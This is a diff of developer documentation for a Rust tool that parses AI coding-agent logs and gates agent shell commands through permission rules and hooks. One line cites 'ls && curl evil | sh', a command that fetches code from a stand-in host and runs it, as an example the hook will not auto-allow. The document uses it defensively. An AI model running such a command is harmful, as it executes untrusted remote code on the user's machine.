@@ -102,13 +102,13 @@ test in a separate process, making this safe and preventing tests from clobberin
   turns, file-history snapshots, summaries, system entries, queue operations, progress updates, custom titles,
   ai-titles, agent names, last prompts, permission-mode changes, session mode records, attachments, PR-link records
   (associating a session with the GitHub PR Claude Code opened or updated; added in Claude Code 2.1.158+),
-  model-refusal-fallback records (when Claude Code retries a refused request on another model, e.g. Fable 5 →
-  Opus 4.8), `fallback` content blocks recording the from/to model pair inside an assistant message (both added in
-  Claude Code 2.1.170+), `image` content blocks inside tool_result content (observed in Claude Code 2.1.170 logs
-  when a tool returns a screenshot), `image` file-attachment content (a user `@`-referencing an image file; uses
-  Claude Code's own base64 `file` envelope with size/dimensions rather than the API's `source` envelope), and a
-  `pendingBackgroundAgentCount` field on `turn_duration` system records (the count of background agents still running
-  when the turn completed; added in Claude Code 2.1.170+)
+  model-refusal-fallback records (when Claude Code retries a refused request on another model, e.g. Fable 5 → Opus 4.8),
+  `fallback` content blocks recording the from/to model pair inside an assistant message (both added in Claude Code
+  2.1.170+), `image` content blocks inside tool_result content (observed in Claude Code 2.1.170 logs when a tool returns
+  a screenshot), `image` file-attachment content (a user `@`-referencing an image file; uses Claude Code's own base64
+  `file` envelope with size/dimensions rather than the API's `source` envelope), and a `pendingBackgroundAgentCount`
+  field on `turn_duration` system records (the count of background agents still running when the turn completed; added
+  in Claude Code 2.1.170+)
 - Also owns the structured view of the raw `model` string via `model::Model { family, version }` plus `ModelFamily` and
   `ModelVersion`. Both `cost_analyzer` (for pricing) and `moriarty::api_pricing` (for grouping/display) consume this one
   parser so family/version classification is not duplicated across crates
@@ -132,8 +132,8 @@ test in a separate process, making this safe and preventing tests from clobberin
   timezone-adjusted date) or per-conversation buckets (keyed by session ID)
 - Per-model aggregation uses `ModelMetricsMap` keyed by `claude_logs::Model` (family + parsed version) so report rows
   and chart legend distinguish e.g. "Sonnet 4" from "Sonnet 4.5"; row/legend ordering is family-first (Fable → Opus →
-  Sonnet → Haiku) then version-desc via the local `model_sort_key` helper, so within-family Opus 4.x rows sit above
-  Opus 3 rows automatically. Token mode stays integer-exact end-to-end instead of passing through floating-point helpers
+  Sonnet → Haiku) then version-desc via the local `model_sort_key` helper, so within-family Opus 4.x rows sit above Opus
+  3 rows automatically. Token mode stays integer-exact end-to-end instead of passing through floating-point helpers
 - Unknown Claude models surface as stderr tracing errors via `cost_analyzer`; they are not rendered in the report
 - Also prepares `ChartBucket` data for `graphs claude`, reusing the same analyzer output while keeping the existing
   detailed table report unchanged
@@ -157,10 +157,10 @@ test in a separate process, making this safe and preventing tests from clobberin
 - `ToolCallContent` keeps the outer tool-call envelope typed (`id`, `name`, `partial_json`) but preserves `arguments` as
   a raw `BTreeMap<String, JsonBlob>` because pi logs the model-emitted JSON object before tool-side validation; typed
   tool-argument structs are optional post-parse helpers, not the parser's source of truth
-- Tool names are raw `String` fields — pi does not validate tool names at the protocol level, so the parser
-  accepts any string (including model-invented names like `task` or `remove`) rather than rejecting unknown tools.
-  Tool-specific result parsing still routes known tool names by string to their typed result-structs where
-  structured post-parse handling is needed; unknown tool results fall through to shape-based deserialization.
+- Tool names are raw `String` fields — pi does not validate tool names at the protocol level, so the parser accepts any
+  string (including model-invented names like `task` or `remove`) rather than rejecting unknown tools. Tool-specific
+  result parsing still routes known tool names by string to their typed result-structs where structured post-parse
+  handling is needed; unknown tool results fall through to shape-based deserialization.
 - Hermes memory/session-search result details are modeled by their shared envelopes rather than per-action sub-schemas:
   search tools use the `success/count/message/output` summary shape, while `memory` and `skill` are routed by
   `tool_name` first because their error details can collapse to either `{}` or a bare `{error}`; once routed, the parser
@@ -227,10 +227,11 @@ test in a separate process, making this safe and preventing tests from clobberin
   - **Compound splitting** (`hooks/command_split.rs`): the hook parses each Bash command with `brush-parser` (a
     pure-Rust, `unsafe`-free shell parser) and evaluates every leaf simple-command independently via
     `apply_rules_compound`, then merges the per-leaf decisions. This means a simple `^ls` allow-rule matches the `ls`
-    leaf of `ls | wc -l` or `a && ls`, and a dangerous tail can no longer hide behind a safe head (`ls && curl evil | sh`
-    ⇒ Ask, never Allow). Merge precedence: any leaf `Denied` ⇒ Deny; else any `Asked`/`NoMatch` (or a multi-leaf
-    `Modified`/`ArgumentFiltered`, which are not stitched back together) ⇒ prompt; only an all-`Allowed` command ⇒ Allow.
-    A single-leaf command returns its decision verbatim, preserving the `ArgumentFilter` re-validation loop.
+    leaf of `ls | wc -l` or `a && ls`, and a dangerous tail can no longer hide behind a safe head
+    (`ls && curl evil | sh` ⇒ Ask, never Allow). Merge precedence: any leaf `Denied` ⇒ Deny; else any `Asked`/`NoMatch`
+    (or a multi-leaf `Modified`/`ArgumentFiltered`, which are not stitched back together) ⇒ prompt; only an
+    all-`Allowed` command ⇒ Allow. A single-leaf command returns its decision verbatim, preserving the `ArgumentFilter`
+    re-validation loop.
   - **`real_file_write` cap**: a leaf with a `>`/`>>`/`>|`/`&>` redirect to a real file (not `/dev/null`, not an fd
     duplication like `2>&1`) has any `Allow` capped at Ask, so a read-only allow-rule (`^echo`) can't green-light
     `echo secret > file`.
@@ -240,31 +241,50 @@ test in a separate process, making this safe and preventing tests from clobberin
     explicit Deny matching the whole command is honored; every other outcome becomes a prompt.
   - **Bash cwd stripping**: like the tool-rules field stripping, a leaf's in-cwd absolute paths are normalized to their
     relative remainder before matching (no `..`-escaping remainder is rewritten), so `^cat src/` matches
-    `cat /abs/cwd/src/x`. `apply_rules(command)` stays the single-command primitive; `apply_rules_compound(command, cwd)`
-    is what the hook calls.
+    `cat /abs/cwd/src/x`. `apply_rules(command)` stays the single-command primitive;
+    `apply_rules_compound(command, cwd)` is what the hook calls.
   - Evaluation order: tool_rules → bash_rules (for Bash) → passthrough (for non-Bash, defers to Claude Code)
 - **Stop hook**: Runs project checks before allowing execution
-- Structured logging with tracing crate for debugging hook execution. The "PreToolUse hook completed" log event
-  records a clean `result` field (`allow`/`deny`/`ask`/`modify`/`passthrough`) classified from the typed `HookOutput`
-  by `hooks::result::pretool_result`, alongside the existing `tool_name` and `tool_args` fields
+- Structured logging with tracing crate for debugging hook execution. The "PreToolUse hook completed" log event records
+  a clean `result` field (`allow`/`deny`/`ask`/`modify`/`passthrough`) classified from the typed `HookOutput` by
+  `hooks::result::pretool_result`, alongside `tool_name`, `tool_args`, `cwd`, `rules_hash`, and `rule` — the name of the
+  rule whose action produced the decision (empty when no rule decided: passthrough, unconfigured-Ask, merged `NoMatch`
+  prompt, or a post-filter re-validation that matched nothing). For a compound command this is the deciding leaf's rule,
+  mirroring `merge_results` precedence, so attribution survives the per-leaf merge
 - **`hooks report` subcommand**: `hooks/report.rs` reads the JSON-lines hook logs, keeps completed PreToolUse records
   that carry the clean `result` field (legacy lines lacking it are skipped), and aggregates them by the exact
-  `(tool name, arguments, result)` triple into a JSON report with counts. Reuses `cost_report::TimeRangeFilter` for
-  `--start-time`/`--end-time` and supports `--tool` and `--result` filters. `report::aggregate` (the shared
-  read+aggregate helper) and `ReportRow` are `pub(crate)` so `rules suggest`/`rules replay` reuse them. The completion
-  log now also records `cwd`; `report.rs` does not parse it back yet, so today's `rules replay` normalizes recorded
-  commands with an empty cwd — capturing `cwd` lets a future replay enhancement normalize them exactly.
+  `(tool name, arguments, result, rule)` key into a JSON report with counts; `rule` is omitted from a row's JSON when no
+  rule decided, so legacy rows serialize exactly as before. Reuses `cost_report::TimeRangeFilter` for
+  `--start-time`/`--end-time` and supports `--tool` and `--result` filters. `report::aggregate` (used by `hooks report`)
+  and `ReportRow` are `pub(crate)`. `report.rs` parses the completion line's `cwd` back into `HookRecord`;
+  `rules suggest`/`rules replay` call `report::aggregate_with_cwd`, which joins `cwd` into the grouping key and
+  populates `ReportRow.cwd` (a `#[serde(skip)]` field) so each command is re-normalized with the directory it actually
+  ran under. `aggregate` keeps `cwd` out of its key and serialization, so `hooks report`'s rows and counts are
+  unchanged; rows recorded before `cwd` was logged fall back to an empty cwd (normalization disabled).
 - **Compile diagnostics & `rules` authoring tooling**: `BashRuleEngine::compile_with_diagnostics` and
   `ToolRuleEngine::compile_with_diagnostics` return the engine plus a `RuleDiagnostic` for every dropped rule
   (undefined/circular/over-depth fragment, invalid regex, or — tool rules only — a `field`/`pattern` given without its
-  partner); `from_config` delegates to them and logs each, preserving the fail-open-per-rule hot path. The `crate::rules`
-  command group surfaces them and helps author safe rules: `lint` (errors when a rule the user wrote is silently
-  dropped; `--strict` additionally warns on likely-shadowed and over-broad Allow rules), `list-fragments`, `schema`
-  (round-tripped against `UserConfig` in tests), `starter` (paste-ready read-only allow-rules that auto-allow the
-  north-star command), `suggest` (anchored exact/prefix rules mined from hook logs; never emits Allow unless
+  partner); `from_config` delegates to them and logs each, preserving the fail-open-per-rule hot path. The
+  `crate::rules` command group surfaces them and helps author safe rules: `lint` (errors when a rule the user wrote is
+  silently dropped; `--strict` additionally warns on likely-shadowed and over-broad Allow rules), `list-fragments`,
+  `schema` (round-tripped against `UserConfig` in tests), `starter` (paste-ready read-only allow-rules that auto-allow
+  the north-star command), `suggest` (anchored rules mined from hook logs; each recorded command is split into the leaf
+  simple-commands the hook actually evaluates — normalized with the recorded cwd — before pattern generation, so
+  compounds yield per-leaf candidates with summed counts, and a bailed command stays whole; `--match exact|prefix|fuzzy`
+  picks the shape, where fuzzy clusters leaves by program and generalizes simple-identifier subcommands into a closed
+  alternation like `^cargo (build|check)(\s|$)`, falling back to a program prefix; never emits Allow unless
   `--match exact`), and `replay` (re-evaluate recorded Bash decisions against a candidate config — the migration
   acceptance gate is zero lost auto-approvals). `test bash-rules --explain [--cwd <dir>]` prints the per-leaf split,
   normalized text, matching rule (with the expanded pattern), and merged decision via `BashRuleEngine::explain`.
+- **Rule-set provenance**: each `PreToolUse hook completed` log line records `rules_hash`, a stable hash of the
+  effective config (`UserConfig::effective_hash`, computed once per hook invocation). The hash covers the parsed config
+  — tool rules, bash rules, and fragments — re-serialized via `serde_json::to_value` so map keys (`pattern_fragments`,
+  an ArgumentFilter `replace` table) sort deterministically while rule order (significant for first-match-wins) is
+  preserved; cosmetic edits don't change it but any semantic change does. `rules suggest`/`rules replay` default to only
+  the records whose `rules_hash` matches the rule set currently installed at the default config path (for `replay` this
+  is the migration source, independent of the `--config` candidate); `--rules-hash <hash>` pins a specific set and
+  `--all-rules` disables the filter. Both commands report the active hash and how many records the filter excluded
+  (`report::RulesHashFilter`/`HashSkipStats`/`CwdAggregation`); excluded counts are never hidden.
 - Security model: Defaults to "Ask" when unconfigured, fail-closed once configured (verification failures block
   execution)
 
@@ -331,7 +351,8 @@ test in a separate process, making this safe and preventing tests from clobberin
 **Repository Root Detection**:
 
 - Approvals are keyed by repository root, not workspace directory
-- Detection order: resolving `.jj/repo` (store directory or pointer file) → `git rev-parse --git-common-dir` → canonicalized path
+- Detection order: resolving `.jj/repo` (store directory or pointer file) → `git rev-parse --git-common-dir` →
+  canonicalized path
 - This allows approval sharing across jujutsu workspaces and git worktrees
 - For jj: `.jj/repo` is the store directory itself in the main workspace and a pointer file in a secondary workspace.
   Absolute pointers are used as-is; a relative pointer is resolved against the `.jj` directory (jj 0.41+) with a
@@ -348,9 +369,9 @@ test in a separate process, making this safe and preventing tests from clobberin
 `crates/moriarty/src/test_helpers.rs`. This module is compiled only in test builds (`#[cfg(test)]`). New test-only
 helpers needed in more than one module belong here rather than being duplicated.
 
-**Logging**: Hook execution is logged via tracing as JSON lines to `~/.local/state/moriarty/hooks/` (daily-rotated);
-the `hooks report` command consumes these. Cost-report commands log to stderr instead. Sensitive env vars (TOKEN,
-SECRET, KEY, PASSWORD) are redacted.
+**Logging**: Hook execution is logged via tracing as JSON lines to `~/.local/state/moriarty/hooks/` (daily-rotated); the
+`hooks report` command consumes these. Cost-report commands log to stderr instead. Sensitive env vars (TOKEN, SECRET,
+KEY, PASSWORD) are redacted.
 
 ### Doc Comments
 
